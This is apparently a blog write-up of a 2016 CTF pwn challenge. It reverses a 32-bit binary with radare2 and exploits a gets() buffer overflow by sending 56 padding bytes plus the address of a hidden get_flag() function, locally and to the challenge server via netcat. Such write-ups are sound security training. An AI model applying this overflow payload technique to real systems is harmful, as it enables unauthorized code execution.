---
title: "3DSCTF 2016 : pwn200-getstarted"
date: "2017-01-08T17:20:00.000Z"
lastmod: "2017-06-05T15:29:41.000Z"
tags: ["ctf", "pwn", "reverse engineering", "3dsctf-2k16"]
images: ["/content/images/2017/01/3ds_109-1.jpg"]
slug: "3dsctf-2016-rev200-getstarted"
url: "/3dsctf-2016-rev200-getstarted/"
---
get_started() - A very proud programmer hid a flag in his binary. Can you extract it? Send to 54.175.35.248 8005

Flag format: 3DS{flag}

## Solution

Received a ELF 32bit binary named **get_started** that asks for a "palavrinha magica" (password) when executed..

![](/writeups/3dsctf-2k16/rev200-getstarted/pasted_image001.png)

..and quits w/ wrong password.

The same program is running on server side, i can confirm w/ `nc 54.175.35.248 8005`

Ok, we don't know the password, lets decompile it..

![](/writeups/3dsctf-2k16/rev200-getstarted/pasted_image003.png)

Radare2 `afl` command shows up lot of functions.. but we can focus on **main()** who call *__printf*() and **gets()** which read user input..

Apparently no one function is calling the **get_flag**()

![](/writeups/3dsctf-2k16/rev200-getstarted/pasted_image004.png)

But everything indicates that function will return our flag. Lets see inside it..

![](/writeups/3dsctf-2k16/rev200-getstarted/pasted_image008.png)

Good, look its read **flag.txt** file and display his content.. All we need!

Ok, I created the **flag.txt** locally with some random content and will try to access it through the program..

![](/writeups/3dsctf-2k16/rev200-getstarted/pasted_image009.png)

Now i started debuggin **get_started** program w/ radare2..

```bash
$ radare2 -Ad get_started
```

- `db 0x08048a36` ;set a breakpoint somewhere in the **main**(), a part that you are sure the program goes through..
- `dc` ;run the program until breakpoin hit..
- `dr eip=0x080489b8` ;redefine **eip** to **0x080489b8,** **get_flag**() address who read/return **flag.txt** content..
- `dc`; to resume the program execution..

![](/writeups/3dsctf-2k16/rev200-getstarted/pasted_image011.png)

We cannot execute the get_secret() function directly to read flag.txt content.. looking at the code, there's two **jne**'s before that should be implemented like [p4-team did](https://github.com/p4-team/ctf/tree/master/2016-12-17-3dsctf/pwn_100_get_started), this is the right way.. but i got the same result jumping directly to **0x080489b8**.

![](/writeups/3dsctf-2k16/rev200-getstarted/pasted_image012.png)

Perfect! we know how to read/display **flag.txt** content by modifying the memory pointer on-the-run.. but, how to do this on server side?

## Buffer overflow

If u see again the main function, theres a buffer of **0x3c(60 bytes)** allocated to user input and **0x4(4 bytes)** to function Return address..

![](/writeups/3dsctf-2k16/rev200-getstarted/pasted_image015.png)

What happens if we send 56 bytes or more to it?

```bash
$ python -c 'print "a"*66' | ./get_started
```

![](/writeups/3dsctf-2k16/rev200-getstarted/pasted_image016.png)

The program breaks causing a **Segmentation fault**... This means it is vulnerable to **Buffer Overflow** attack.

So, if we send exactly 56 bytes(random chars, like a's) + 4 bytes containing any memory address the program will Return to given memory address!

```bash
$ python -c 'print "a"*56 + "\xb8\x89\x04\x08"' | ./get_started
```

**\xb8\x89\x04\x08** = **0x080489b8** converted to Hex Little Endian (**08 04 89 b8** backward)

![](/writeups/3dsctf-2k16/rev200-getstarted/pasted_image017.png)

Now you have exploited the program locally.. do the same remotely piping on netcat..

```bash
$ python -c 'print "a"*56 + "\xb8\x89\x04\x08"' | nc 54.175.35.248 8005
```

![](/content/images/2017/03/Selection_999-035-.png)

**Flag**: 3DS{CENSORED}

#### Bonus: Exploiting w/ Pwntools

<script src="https://gist.github.com/22ad1e62f50ca196c455b3c71ad7709a.js"> </script>

#### The same w/ netcat.py

<script src="https://gist.github.com/intrd/cd21b773134e4729d3f31829f7a768ab.js"></script>
